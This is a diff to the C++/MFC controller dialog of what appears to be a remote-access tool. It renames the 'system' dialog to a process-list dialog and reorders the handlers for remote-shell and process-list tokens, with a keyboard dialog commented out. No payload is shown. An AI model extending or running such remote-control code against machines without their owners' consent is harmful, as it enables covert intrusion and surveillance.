@@ -326,7 +326,7 @@ BEGIN_MESSAGE_MAP(CUIDlg, CDialogEx)
 	ON_MESSAGE(UM_ICONNOTIFY, (LRESULT(__thiscall CWnd:: *)(WPARAM, LPARAM)) &CUIDlg::OnIconNotify)
 	ON_MESSAGE(WM_ADDONLINE, &CUIDlg::OnAddOnline)
 	ON_MESSAGE(WM_OPENSHELLDIALOG, &CUIDlg::OnOpenShellDlg)
-	ON_MESSAGE(WM_OPENPSLISTDIALOG, &CUIDlg::OnOpenSystemDialog)
+	ON_MESSAGE(WM_OPENPSLISTDIALOG, &CUIDlg::OnOpenProcessDialog)
 
 	ON_COMMAND(ID_MAIN_SETTING, &CUIDlg::OnMainSetting)
 	ON_COMMAND(ID_MIAN_CLOSE, &CUIDlg::OnMianClose)
@@ -401,12 +401,12 @@ void CUIDlg::ProcessReceiveComplete(ClientContext *pContext)
 			//((CKeyBoardDlg *)dlg)->OnReceiveComplete();
 			break;
 
-		case SYSTEM_DLG:
-			((CSystemDlg *)dlg)->OnReceiveComplete();
-			break;
-
 		case SHELL_DLG:
 			((CShellDlg *)dlg)->OnReceiveComplete();
+			break;
+
+		case PSLIST_DLG:
+			((CSystemDlg *)dlg)->OnReceiveComplete();
 			break;
 
 		default:
@@ -469,13 +469,14 @@ void CUIDlg::ProcessReceiveComplete(ClientContext *pContext)
 		//g_pConnectView->PostMessage(WM_OPENKEYBOARDDIALOG, 0, (LPARAM)pContext);
 		break;
 
+	case TOKEN_SHELL_START:
+		g_UIDlg->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
+		break;
+
 	case TOKEN_PSLIST:
 		g_UIDlg->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
 		break;
 
-	case TOKEN_SHELL_START:
-		g_UIDlg->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
-		break;
 		// 命令停止当前操作
 	default:
 		closesocket(pContext->m_Socket);
@@ -810,7 +811,7 @@ LRESULT CUIDlg::OnOpenShellDlg(WPARAM wParam, LPARAM lParam)
 	return LRESULT();
 }
 
-LRESULT CUIDlg::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
+LRESULT CUIDlg::OnOpenProcessDialog(WPARAM wParam, LPARAM lParam)
 {
 	ClientContext *pContext = (ClientContext *)lParam;
 	CSystemDlg *dlg = new CSystemDlg(this, g_iocpServer, pContext);
@@ -819,7 +820,7 @@ LRESULT CUIDlg::OnOpenSystemDialog(WPARAM wParam, LPARAM lParam)
 	dlg->Create(IDD_DIALOG_SYSTEM, GetDesktopWindow());
 	dlg->ShowWindow(SW_SHOW);
 
-	pContext->m_Dialog[0] = SYSTEM_DLG;
+	pContext->m_Dialog[0] = PSLIST_DLG;
 	pContext->m_Dialog[1] = (int)dlg;
 
 	return LRESULT();
@@ -877,6 +878,6 @@ void CUIDlg::OnOnlineCmd()
 // 进程管理
 void CUIDlg::OnProcess()
 {
-	BYTE bToken = COMMAND_SYSTEM;
+	BYTE bToken = COMMAND_PSLIST;
 	SendSelectedToken(&bToken, sizeof(BYTE));
 }
